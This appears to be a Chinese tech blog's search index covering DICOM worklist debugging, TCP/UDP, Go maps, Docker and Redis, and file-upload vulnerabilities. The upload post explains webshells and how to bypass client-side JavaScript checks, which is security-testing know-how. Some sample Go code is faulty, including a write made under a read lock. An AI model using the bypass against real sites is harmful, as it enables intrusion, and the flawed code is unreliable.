[{"categories":null,"content":"联调放射设备时如何一把让设备刷到worklist ","date":"2021-09-03","objectID":"/posts/%E5%B7%A5%E4%BD%9C%E6%97%A5%E8%AE%B0%E4%B9%8B%E8%81%94%E8%B0%83%E6%94%BE%E5%B0%84%E8%AE%BE%E5%A4%87%E6%97%B6%E5%A6%82%E4%BD%95%E8%AE%A9%E8%AE%BE%E5%A4%87%E5%BF%AB%E9%80%9F%E5%88%B7%E5%88%B0worklist/:1:0","tags":["工作日记"],"title":"工作日记-让放射设备快速从Dicom服务上刷到worklist的方法","uri":"/posts/%E5%B7%A5%E4%BD%9C%E6%97%A5%E8%AE%B0%E4%B9%8B%E8%81%94%E8%B0%83%E6%94%BE%E5%B0%84%E8%AE%BE%E5%A4%87%E6%97%B6%E5%A6%82%E4%BD%95%E8%AE%A9%E8%AE%BE%E5%A4%87%E5%BF%AB%E9%80%9F%E5%88%B7%E5%88%B0worklist/"},{"categories":null,"content":"（只适用于调试正在使用的设备😁） 有些医院有的放射设备维保期过了，或者是没有设备文档的情况下，dicom联调时服务就变得非常麻烦 按照下面步骤基本可以一把成功刷到worklist 第一步 登录现在正在使用的pacs服务器，装一个wireshark 第二步 过滤条件中IP条件过滤为设备IP，协议条件过滤为dicom 第三步 从设备上请求worklist 第四步 然后查看描述信息为：P-DATA, C-FIND-RQ-DATA的包 展开DICOM, C-FIND-RSP, C-FIND-RSP-DATA 然后再展开PDV, C-FIND-RSP-DATA 就可以看到返回的所有tag信息 第五步 在自己的服务器上对照着上面的抓到的tag信息配置上 完活儿~ 注意：有些tag如果返回了但是值为空的话可能会被设备过滤掉，最好与抓到的包中的信息一致 调设备给我人调麻了😭 ","date":"2021-09-03","objectID":"/posts/%E5%B7%A5%E4%BD%9C%E6%97%A5%E8%AE%B0%E4%B9%8B%E8%81%94%E8%B0%83%E6%94%BE%E5%B0%84%E8%AE%BE%E5%A4%87%E6%97%B6%E5%A6%82%E4%BD%95%E8%AE%A9%E8%AE%BE%E5%A4%87%E5%BF%AB%E9%80%9F%E5%88%B7%E5%88%B0worklist/:2:0","tags":["工作日记"],"title":"工作日记-让放射设备快速从Dicom服务上刷到worklist的方法","uri":"/posts/%E5%B7%A5%E4%BD%9C%E6%97%A5%E8%AE%B0%E4%B9%8B%E8%81%94%E8%B0%83%E6%94%BE%E5%B0%84%E8%AE%BE%E5%A4%87%E6%97%B6%E5%A6%82%E4%BD%95%E8%AE%A9%E8%AE%BE%E5%A4%87%E5%BF%AB%E9%80%9F%E5%88%B7%E5%88%B0worklist/"},{"categories":null,"content":"简介 TCP(Transmission Control Protocol)传输控制协议，是一种面向连接的、可靠的、基于字节流的传输层通信协议 面向连接：点对点的连接 字节流：是指传输过程中，传输数据的最基本单位是字节的流，一个不包含边界数据的连续流 流：流是一个抽象的概念，是对输入输出的抽象，输入流可以看作一个输入通道，输出流可以看作一个输出通道。外部传入数据给程序需要借助输入流。程序传输到外部需要借助输出流 TCP是传输层的协议 TCP连接是全双工的，并且是点到点的。TCP不支持组播和广播的传输模式 一个TCP连接使用源地址、源端口、目的地址、目的端口四元组来确定（源地址和目标地址在IP层写入） ","date":"2021-07-28","objectID":"/posts/tcp/:1:0","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"TCP头部格式 1.源端口号：自己的端口号 2.目标端口号：对方的端口号 3.序列号：在建立连接时由计算机生成的随机数作为其初始值，每交换一次数据，该值就会+1被放到确认应答号中，用来解决包乱序 4.确认应答号：发送端收到这个确认应答号后，会认为在这之前的数据都已经被正常接收。用来解决不丢包 5.首部长度：该字段指明了TCP头包含多少个32位的字。这个信息是必须的，因为选项字段是可变长的，因而整个头也是变长的 6.8个1比特的标志位 CWR：当收到了接收端的ECE信号时，发送端将CWR标志位设置为1，发送给接收端，这样接收端就知道了发送端放慢了发送速度 ECE：当TCP端收到了网络拥塞的指示后，就设置ECE给TCP发送端发ECN-Echo信号，告诉发送端放慢发送速率 URG：该位为1时，表示此数据包需要立即发送，无需考虑发送顺序问题 ACK：表示确认应答 PSH：与URG相对应，让接收端首先接收这条数据 RST：表示出现异常并必须强制断开连接 SYN：只有建立连接请求和确认请求的两个数据包中的SYN为1（三次握手的第一二次握手） FIN：表示该连接要被释放，发送端已经没有数据要传输了。 7.窗口大小：用于TCP流量控制，该字段指定了从被确认的字节算起可以发送多少个字节，该字段值可以为0 8.校验和： 9.紧急指针 10.选项（0或32位的倍数）：提供了一种添加额外数据的字段，主要针对常规头覆盖不到的方面。协议定义了许多选项，选项的长度可变长，但必须是32位的倍数，不足32位用0填充。选项有40个字节的空间 11.数据 ","date":"2021-07-28","objectID":"/posts/tcp/:2:0","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"建立连接 TCP是面向连接的协议，建立连接是通过三次握手进行的 ","date":"2021-07-28","objectID":"/posts/tcp/:3:0","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"三次握手 第一次握手 服务端执行listen原语 1.客户端执行connect原语 2.初始化一个序列号，放到TCP首部的序号字段中 3.把SYN标志位置为1，向服务端发起连接，该报文不包含应用层之间的数据 之后客户端处于SYN-SENT状态 第二次握手 1.当第一次握手的数据段到达服务端后，服务器的TCP实体会先检查首部的目的端口号是否被进程监听，如果没有则返回一个RET标志位位1的报文，拒绝连接。如果有进程监听，则进入第二步，交给监听该端口的进程处理 2.服务端收到客户端的SYN报文后，会随机初始化自己的序号，然后将序号写入TCP首部的序号字段中 3.将TCP首部的序列号字段+1，写入确认应答号中 4.将SYN和ACK标志位置为1 5.将该报文发送给客户端 6.之后服务端置于SYN-RCVD状态 第三次握手 1.将TCP首部ACK标志位置为1 2.将序列号+1写入确认应答号中 3.将报文发送给服务端 4.置于ESTABLISHED（确认连接）状态 ","date":"2021-07-28","objectID":"/posts/tcp/:3:1","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"连接释放 ","date":"2021-07-28","objectID":"/posts/tcp/:4:0","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"四次挥手 如客户端想要断开连接 1.客户端向服务端发送一个TCP首部FIN标志位为1的报文，请求断开链接，之后客户端进入fin_wait_1状态 2.服务端收到报文后向客户端发送ACK标志位为1的报文，然后进入fin_wait_2状态 3.服务端处理完数据后，也向客户端发送一个FIN标志位为1的报文，之后进入last_ack状态 4.客户端收到服务端发送的FIN报文后，向服务端回复一个ACK标志位为1的报文，然后进入time_wait状态 服务端收到ack报文后，立即进入close状态 之后客户端在经过2msl的等待之后自动进入close状态 每一方都需要发送一个FIN和ACK报文 ","date":"2021-07-28","objectID":"/posts/tcp/:4:1","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"TCP滑动窗口 滑动窗口负责告诉发送端接收端的缓冲区可用空间，然后发送端控制自己发送数据的不超过接收端缓冲区可用空间 异常情况 当滑动窗口的值为0时 紧急数据仍然可以发送，如杀掉远程机器上的某个进程 发送端可以发送一个1字节的段，请求接收端重新发送滑动窗口的大小。该数据包被成为窗口探测（window probe）。TCP标准明确提供了这个选项，防止数据包丢失后发生死锁 ","date":"2021-07-28","objectID":"/posts/tcp/:5:0","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"UDP User Datagram Protocol 用户数据报协议，和TCP一样，位于OSI模型的传输层 UDP是无连接的，不可靠的数据报协议 数据报：面向无连接的数据传输，工作过程类似于报文交换。采用数据报方式传输时，被传输的分组称为数据报 ","date":"2021-07-28","objectID":"/posts/tcp/:6:0","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"UDP头部格式 源端口：源端口号，在需要对方回信时候写入，不需要则为0 目标端口：目的端口 包长度：保存了UDP首部的长度和数据长度之和 校验和：校验和是为了提供可靠的UDP首部和数据，检测UDP用户数据报在传输中是否有错。有错就丢弃。 ","date":"2021-07-28","objectID":"/posts/tcp/:6:1","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"TCP和UDP的区别 1.连接： TCP：面向连接的传输层协议，传输数据首先要建立连接 UDP：无连接的协议，不用建立连接，直接发送数据 2.服务对象 TCP：一对一的服务 UDP：可以一对一、一对多、多对多 3.可靠性 TCP：会保证数据无差错、不丢失、不重复、按需到达 UDP：不保证数据的完整性 4.流量控制 TCP：有流量控制和拥塞控制机制，保证数据传输的安全性 UDP：没有流量控制机制，无论网络环境如何，照常发送数据 ","date":"2021-07-28","objectID":"/posts/tcp/:6:2","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"学习资料 https://github.com/QSCTech/zju-icicles/blob/master/计算机网络基础/教材/计算机网络 第5版.pdf https://mp.weixin.qq.com/s/rX3A_FA19n4pI9HicIEsXg https://zh.wikipedia.org/wiki/用户数据报协议 https://wiki.mbalib.com/wiki/%E6%95%B0%E6%8D%AE%E6%8A%A5 ","date":"2021-07-28","objectID":"/posts/tcp/:7:0","tags":["基础知识"],"title":"TCP","uri":"/posts/tcp/"},{"categories":null,"content":"Map 一种成对出现的键值数据结构，一个map中有多个键值对 key必须是可哈希的数据类型 map是线程不安全的 ","date":"2021-07-03","objectID":"/posts/golang-map/:1:0","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"Map实现方式 map是基于哈希表存储的 1.根据hash算法计算出键的哈希值 2.根据哈希值和哈希表的数量进行取模运算 3.计算出来的值就是这个key放入到哈希表的位置 哈希计算一般会存在哈希碰撞问题，不同的key能能计算出的值是一样的 如果出现了哈希碰撞，则会在这个位置以链表的形式存储落到该位置上的key ","date":"2021-07-03","objectID":"/posts/golang-map/:1:1","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"初始化 通过make来初始化分配内存 每个key只能出现一次，如果同一个key出现两次，后面key的val会覆盖之前key的val m = make(map[int]string, 10) 1.当make的时候，会创建一个hmap结构体对象 2.生成一个哈希因子hash0并赋值到hmap对象中，用于后续为key创建哈希值 3.根据指定的map长度计算出B的长度 4.然后根据B去创建桶（bmap）并存放在buckets数组中 当B\u003c4时，根据B创建桶的个数的规则为：2^B（标准桶） 当B\u003e=4时，根据B创建桶的个数的规则为2^B+2^B-4（标准桶+溢出桶） 每个bmap可以存放8个键值对，当空间不够时，则需要使用溢出桶，并将当前bmap中的overflow指向溢出桶的位置 ","date":"2021-07-03","objectID":"/posts/golang-map/:1:2","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"写入数据 m[1] = \"test\" 1.使用哈希因子对键进行哈希运算，得到一个结果 2.获取改结果的后B位，并根据后B为的值来决定将此键值对存放到那个桶中（bmap） 将哈希值和桶掩码进行\u0026运算，最终得到哈希值的后B位的值。假设当B位1时，其结果为0 哈希值：0110111000111111111101110111010 桶掩码：0000000000000000000000000000001 结果 :00000000000000000000000000000000 = 0 找桶的原则实际上是根据后B位的位运算计算出索引位置，然后再根据buckets数组中根据索引找到目标桶（bmap） 也可以在声明时直接赋值，该方式不用make var m map[string]string{ \"test1\":\"a\", \"test2\":\"b\", \"test3\":\"c\" } ","date":"2021-07-03","objectID":"/posts/golang-map/:1:3","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"修改数据 m[\"test1\"] = 1 上面提到过，每个key只能出现一次，如果修改的key在map中已经存在，上面代码则会修改之前key的val 如果没有，则会新增 修改之前可以先查询下 ","date":"2021-07-03","objectID":"/posts/golang-map/:1:4","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"删除数据 delete(mapName,\"key\") key存在时则执行删除操作 key不存在时，也不会报错 删除所有的key 1.可以遍历删除 2.可以再次对该map进行make操作，旧的key会被GC回收 没有内置的清空所有key的方法 ","date":"2021-07-03","objectID":"/posts/golang-map/:1:5","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"遍历数据 可以使用for range方法和for循环来遍历 //for range方法示例 m := map[string]string{ \"test1\":\"1\", \"test2\":\"2\", } for k, v := range m { fmt.Println(k, v) } test1 1 test2 2 遍历嵌套map时可以在for range里面再套一层for range ","date":"2021-07-03","objectID":"/posts/golang-map/:1:6","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"sync.Map golang中的map是并发不安全的，从go1.9开始，加入了sync.Map，用来解决map并发安全的问题 ","date":"2021-07-03","objectID":"/posts/golang-map/:2:0","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"map实现并发安全 map需要加锁实现并发安全 var m = make(map[string]int) var rwlock sync.RWMutex func get(key string) int { rwlock.RLock() s := m[key] rwlock.RUnlock() return s } func set(key string, value int) { rwlock.RLock() m[key] = value rwlock.RUnlock() } func main() { wg := sync.WaitGroup{} for i := 0; i \u003c 21; i++ { wg.Add(1) go func(n int) { key := strconv.Itoa(n) set(key, n) fmt.Printf(\"key=%v,v=%v\\n\", key, get(key)) wg.Done() }(i) } wg.Wait() } 但是如果map中数据量较大时，加锁则会影响性能 ","date":"2021-07-03","objectID":"/posts/golang-map/:2:1","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"sync.Map type Map struct { mu Mutex // read contains the portion of the map's contents that are safe for // concurrent access (with or without mu held). // // The read field itself is always safe to load, but must only be stored with // mu held. // // Entries stored in read may be updated concurrently without mu, but updating // a previously-expunged entry requires that the entry be copied to the dirty // map and unexpunged with mu held. read atomic.Value // readOnly // dirty contains the portion of the map's contents that require mu to be // held. To ensure that the dirty map can be promoted to the read map quickly, // it also includes all of the non-expunged entries in the read map. // // Expunged entries are not stored in the dirty map. An expunged entry in the // clean map must be unexpunged and added to the dirty map before a new value // can be stored to it. // // If the dirty map is nil, the next write to the map will initialize it by // making a shallow copy of the clean map, omitting stale entries. dirty map[interface{}]*entry // misses counts the number of loads since the read map was last updated that // needed to lock mu to determine whether the key was present. // // Once enough misses have occurred to cover the cost of copying the dirty // map, the dirty map will be promoted to the read map (in the unamended // state) and the next store to the map will make a new dirty copy. misses int } sync.Map通过read和dirty两个字段把读写分离，读的数据存到read上，写入的数据存到dirty字段 读的时候先查询read，查不到再查dirty 写的话只写入到dirty中 读read不加锁，读写dirty都加锁 通过misses来记录查询dirty的次数，超过指定的次数则将dirty中的数据同步到read中 通过上面可以了解到，sync.Map通过读写分离的方式解决并发安全问题，适用于读取比写入频率高的场景 ","date":"2021-07-03","objectID":"/posts/golang-map/:2:2","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"sync.Map中的方法 Store 用来新增数据 func (m *Map) Store(key, value interface{}) { var m sync.Map m.Store(\"test\",\"a\") Load 返回指定key的val，如果key没有查到，val则被置为nil，ok会被标记为false func (m *Map) Load(key interface{}) (value interface{}, ok bool) { var m sync.Map m.Store(\"test\",\"a\") valA,ok := m.Load(\"test\") if !ok { log.Println(\"key does not exist\") return }else { fmt.Println(valA) //a } 查找不存在的key // 不存在的key valB, ok := m.Load(\"test1\") if !ok { log.Println(\"key does not exist\") //key does not exist return }else { fmt.Println(valB) } Delete 删除指定的key func (m *Map) Delete(key interface{}) { var m sync.Map m.Store(\"test\",\"a\") m.Delete(\"test\") m.Delete(\"pass\") //指定的key不存在时也不会报错 Range 用来遍历元素 func (m *Map) Range(f func(key, value interface{}) bool) { var m sync.Map m.Store(\"test1\",\"a\") m.Store(\"test2\",\"b\") m.Store(\"test3\",\"c\") m.Range(func(key, value interface{}) bool { fmt.Printf(\"key:%v,val:%v\\n\",key,value) return true }) //key:test1,val:a //key:test2,val:b //key:test3,val:c LoadOrStore 传入一个key和val，返回val和bool 如果传入的key存在，则返回key的val和true，如果不存在，则存储传入的key和val，并返回val和false func (m *Map) LoadOrStore(key, value interface{}) (actual interface{}, loaded bool) { var m sync.Map m.Store(\"test1\", \"a\") store, ok := m.LoadOrStore(\"test4\", \"d\") fmt.Println(store, ok) // d false tStore, ok := m.LoadOrStore(\"test1\", \"1\") fmt.Println(tStore, ok) // a true ","date":"2021-07-03","objectID":"/posts/golang-map/:2:3","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"总结 map+sync.RWMutex使用于数据量比较小的场景 sync.Map适用于读比写频率高的场景 学习的还不够深入，继续加油 ","date":"2021-07-03","objectID":"/posts/golang-map/:3:0","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"学习资料 Go SDK 1.14.4 sync.Map https://qcrao91.gitbook.io/go/map https://draveness.me/golang/docs/part2-foundation/ch03-datastructure/golang-hashmap/ https://blog.csdn.net/jiankunking/article/details/78808978 https://blog.csdn.net/u010230794/article/details/82143179 ","date":"2021-07-03","objectID":"/posts/golang-map/:4:0","tags":["Golang"],"title":"Golang之Map","uri":"/posts/golang-map/"},{"categories":null,"content":"什么是Docker docker是一款轻量级的虚拟化工具，它会提供一个虚拟环境，名为容器。 容器需要运行镜像来生成。 构建镜像可以使用docker commit命令和编辑Dockerfile文件后使用docker build命令构建 在linux中，通过命名空间与物理机的进程、网络、文件系统、CPU内存等资源的隔离。 容器可以打包成镜像后移动到另一个物理机器中，然后运行该镜像即可生成一个容器。 这样就完成了容器的移植。 — 下面内容摘自docker官网 将软件打包到标准化单元进行开发、装运和部署 容器是软件的标准单元，可将代码及其所有依赖项打包，以便应用程序从一个计算环境快速可靠地运行到另一个计算环境。Docker 容器镜像是一个轻量级、独立、可执行的软件包，包括运行应用程序所需的一切：代码、运行时间、系统工具、系统库和设置。 容器镜像在运行时变成容器，在docker容器的情况下 - 图像成为容器时，他们运行在docker引擎。针对 Linux 和 Windows 的应用程序，无论基础设施如何，容器化软件始终运行相同。容器将软件与环境隔离开来，并确保它工作一致，尽管开发和分期之间存在差异。 在码头发动机上运行的码头集装箱： **标准：**Docker 为容器创建了行业标准，因此它们可以在任何地方移植 **重量轻：**容器共享机器的操作系统内核，因此不需要每个应用程序的操作系统，从而提高服务器效率并降低服务器和许可成本 **安全：**在容器中应用更安全，Docker 提供业内最强的默认隔离功能 ","date":"2021-06-22","objectID":"/posts/docker/:1:0","tags":["docker"],"title":"docker","uri":"/posts/docker/"},{"categories":null,"content":"常用命令 列出所有镜像 docker images 运行镜像 docker run -it ... /bin/bash以交互模式运行 --name 运行镜像后生成的容器名称 -p 8080:8081 将容器中的8081端口映射到本机的8080端口 -v /home/data:/data 将容器中的/data目录映射到本地的/home/data目录 列出所有容器 docker ps -a 列出正在运行的容器 docker ps 启动容器 docker start 容器id/容器名称 停止容器 docker stop 容器id/容器名称 重启容器 docker restart 容器id/容器名称 进入容器 docker exec -it 容器id/容器名称 bash 容器和物理机相互拷贝文件 将容器内/usr/local/redis/conf/redis.conf拷贝到物理机的当前目录\\ docker cp 容器id/名称:/usr/local/redis/conf/redis.conf ./ 将物理机当前目录下的redis.conf文件拷贝到容器内的/etc目录下 docker cp ./redis.conf 容器id/名称:/etc/ 删除容器（只能删除停止的容器） docker rm 容器id/容器名称 删除镜像 docker rmi imageId ","date":"2021-06-22","objectID":"/posts/docker/:2:0","tags":["docker"],"title":"docker","uri":"/posts/docker/"},{"categories":null,"content":"导出导入 ","date":"2021-06-22","objectID":"/posts/docker/:3:0","tags":["docker"],"title":"docker","uri":"/posts/docker/"},{"categories":null,"content":"导出 1.提交容器修改，会新创建一个镜像 docker commit 10874ee33238 oracle:6120bak 2.查看保存的镜像 docker images 3.将镜像另存一个备份文件 docker save -o oracle.tar oracle:6120bak ","date":"2021-06-22","objectID":"/posts/docker/:3:1","tags":["docker"],"title":"docker","uri":"/posts/docker/"},{"categories":null,"content":"导入 4.导入镜像 docker load \u003c oracle.tar docker load -i oracle.tar ","date":"2021-06-22","objectID":"/posts/docker/:3:2","tags":["docker"],"title":"docker","uri":"/posts/docker/"},{"categories":null,"content":"构建镜像 构建镜像有两种方式，一种是基于已有镜像生成的容器，使用commit命令提交对容器的修改 一种是使用Dockerfile编译生成镜像 ","date":"2021-06-22","objectID":"/posts/docker/:4:0","tags":["docker"],"title":"docker","uri":"/posts/docker/"},{"categories":null,"content":"commit commit命令是依照当前容器创建一个镜像 可以理解为当对初始镜像run之后生成的容器做了修改之后，就可以使用commit命令来提交对该容器的修改 比如说一个centos7镜像，在run之后生成的容器上安装了一个gcc，此时就可以使用commit命令来提交对该容器的修改，此时commit的只是初始状态可当前状态之间有差异的部分，所以commit操作就很轻量 示例 运行一个镜像 [root@pacs ~]# docker run -dit --name centos7 ansible/centos7-ansible:1.8 fb26e1fd669bbccdd2fb0fdd1e1a312dcc815df4c45969de662416c71d752f39 查看正在运行中的容器 [root@pacs ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fb26e1fd669b ansible/centos7-ansible:1.8 \"/bin/bash\" 37 seconds ago Up 33 seconds centos7 进入centos7容器 [root@pacs ~]# docker exec -it centos7 bash [root@fb26e1fd669b ansible]# 退出centos7容器 [root@fb26e1fd669b home]# exit exit 安装gcc 步骤略 查看gcc是否安装成功 gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) 提交对容器的修改 [root@pacs gcc]# docker commit -m \"intall gcc\" fb26e1fd669b centos7:v2 sha256:48439ec1ff536277c2a4870ff068c2d0415751f9a21ee958af0bf0d873e0f9aa 参数说明： -m：指定提交说明信息 fb26e1fd669b：容器id centos7:v2：指定image名称和版本号 查看生成的镜像 [root@pacs gcc]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE centos7 v2 48439ec1ff53 12 seconds ago 705MB 将旧的容器停止并删掉 [root@pacs gcc]# docker stop fb26e1fd669b fb26e1fd669b [root@pacs gcc]# docker rm fb26e1fd669b fb26e1fd669b 运行新的镜像 [root@pacs gcc]# docker run -dit --name centos7 centos7:v2 c1f9774ca85e8fa652e29adaa39e62e2909e6dfb604aac09fb1a8f11e2a77d1d 查看生成的容器 [root@pacs gcc]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES c1f9774ca85e centos7:v2 \"/bin/bash\" About a minute ago Up About a minute centos7 进入容器 [root@pacs gcc]# docker exec -it centos7 bash [root@c1f9774ca85e ansible]# 查看gcc是否安装 [root@c1f9774ca85e ansible]# gcc -v Using built-in specs. ... gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ","date":"2021-06-22","objectID":"/posts/docker/:4:1","tags":["docker"],"title":"docker","uri":"/posts/docker/"},{"categories":null,"content":"Dockerfile dockerfile是一个文件，该文件中保存了将要创建的容器信息 然后使用docker build创建镜像 Dockefile: dockerfile可分为下面几个部分： 基础镜像信息 维护者信息 镜像操作指令 容器启动时执行指令 Dockerfile中的常用指令 FROM：指定基础镜像，如创建一个nginx镜像，基础镜像可以指定centos或ubuntu，表示在该镜像的基础上构建，官方指定的是debian ENV：用来定义镜像的环境变量 LABEL：指定镜像标签，一个镜像可以有多个标签 RUN：运行该镜像时执行的命令 ADD：添加文件到镜像中，如果是tar文件，会自动提取到指定的目录 WORKDIR：为RUN、CMD、COPY和AND设置当前工作目录 VOLUME：指定挂载到宿主机那个目录。一般用在docker run中，在运行镜像时使用-v指定目录挂载 USER：指定运行容器的用户 EXPOSE：指定容器运行后需要监听的端口 CMD：指定启动容器时运行的命令或脚本，只能有一条被执行，有多条时则执行最后一条 示例： FROMcentos:7LABEL maintainer=\"\u003crui.u@foxmail.com\u003e\"RUN yum -y install gcc \\ yum -y install makeCOPY redis-5.0.10.tar.gz /usr/localRUN tar -zxvf /usr/local/redis-5.0.10.tar.gz -C /usr/local \u0026\u0026 rm -f /usr/local/redis-5.0.10.tar.gz \u0026\u0026 mv /usr/local/redis-5.0.10 /usr/local/redisWORKDIR/usr/local/redisRUN make \u0026\u0026 make install \u0026\u0026 rm -rf redis.confCOPY redis.conf ./EXPOSE6379WORKDIR/ENTRYPOINT [\"/usr/local/redis/src/redis-server\",\"/usr/local/redis/redis.conf\"]CMD [] 把Dockerfile文件中所需的文件放到与Dockerfile的同级目录， [root@pacs dockerfi]# ls Dockerfile redis-5.0.10.tar.gz redis.conf 执行命令编译镜像文件 [root@pacs dockerfi]# docker build -t redis:rui ./ -t：指定编辑好的镜像的name和tag ./：指定Dockerfile的位置 编译完成之后使用docker images查看编译好的镜像 [root@pacs dockerfi]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE redis rui c63f66127130 9 minutes ago 556MB 执行下面命令运行镜像 [root@pacs dockerfi]# docker run -d --name redis -p 6379:6379 redis:rui 474523dd27912b981a828789c27d640891dbf350e96b00f575e5479da1bdf636 [root@pacs dockerfi]# 查看正在运行的容器 [root@pacs dockerfi]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 474523dd2791 redis:rui \"/usr/local/redis/sr…\" 5 seconds ago Up 2 seconds 0.0.0.0:6379-\u003e6379/tcp redis 进入容器 [root@pacs dockerfi]# docker exec -it redis bash [root@474523dd2791 /]# 测试redis [root@474523dd2791 /]# redis-cli 127.0.0.1:6379\u003e ping (error) NOAUTH Authentication required. 127.0.0.1:6379\u003e quit [root@474523dd2791 /]# redis-cli 127.0.0.1:6379\u003e auth admin OK 127.0.0.1:6379\u003e ping PONG 127.0.0.1:6379\u003e set test 1 OK 127.0.0.1:6379\u003e get test \"1\" 127.0.0.1:6379\u003e del test (integer) 1 127.0.0.1:6379\u003e get test (nil) 127.0.0.1:6379\u003e 遇到的麻烦 docker run 后面不能跟/bin/bash，否则会覆盖掉Dockerfile中cmd后面执行的命令， 也会导致容器进程不能维持运行， 可是我运行的参数写到了ENTRYPOINT后面 pull的其它镜像一般都是使用-dit /bin/bash方式运行，并没有发现有什么问题 可能还是我的Dockerfile写的有问题 还是需要继续学习啊 ","date":"2021-06-22","objectID":"/posts/docker/:4:2","tags":["docker"],"title":"docker","uri":"/posts/docker/"},{"categories":null,"content":"学习资料 docker官方文档： https://docs.docker.com/engine/reference/builder/#shell csdn： https://blog.csdn.net/wangziyang777/article/details/114277452 https://blog.csdn.net/guyan0319/article/details/81020252 https://blog.csdn.net/persistencegoing/article/details/93713869 redis官方镜像dockerfile（看的迷迷糊糊😭）： https://github.com/docker-library/redis/blob/147762b57f4d4391ba6cf8fbd1e7590a606643ef/5/Dockerfile dockerhub： https://hub.docker.com/ ","date":"2021-06-22","objectID":"/posts/docker/:5:0","tags":["docker"],"title":"docker","uri":"/posts/docker/"},{"categories":null,"content":"文件上传漏洞 当文件上传点未对上传的文件进行严格的验证和过滤时，就容易造成任意文件上传，比如webshell文件 如果文件上传的目录没有限制执行权限，导致上传的动态文件可以正常执行并且访问，即造成了文件上传漏洞 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"什么是webshell webshell简称网页后门，运行在web应用上的远程控制程序 其实就是一个网页，由PHP、jsp、asp、asp.net等之类的web应用程序语言开发，但是webshell并不具备常见网页的功能，例如登录、注册、信息展示功能，一般会具备文件管理、端口扫描、提权、获取信息等功能。拥有较为完善功能的webshell称之为大马。功能简单的webshell称为小马 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"上传检测流程 1.前端提交 JavaScript检测 Flash AS检测 2.数据传输 WAF拦截 IPS拦截 服务端处理 扩展名检测 MIME TYPE检测（文件参数中的content-type） 文件格式检测 内容检测（同WAF/IDS） 写入文件系统 文件重命名 杀毒软件查杀 访问文件 无执行权限 未知位置 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"客户端检测绕过 1.JavaScript检测：通过浏览器提交上传请求前，出发检测用JS脚本进行检测，如普通表单上传 2.Flash AS脚本检测：上传用Flash中，提交上传请求前，触发检测用AS脚本进行检测 3.APP上传检测：检测写在APP客户端代码中，或者所调用的HTML页面中 客户端检测一般只检测文件扩展名 客户端进行的检测可通过对客户端代码的修改或拦截请求修改报文即可绕过 ","date":"2021-05-23","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:4:0","tags":["安全测试"],"title":"安全测试之-文件上传","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"前端JavaScript检测绕过 1.查看onchange、onsubmit等事件 onchange事件会在域的内容改变时发生 onsubmit事件会在表单的确认按钮被点击时发生，如下图示例 2.删掉相关事件中的检测函数 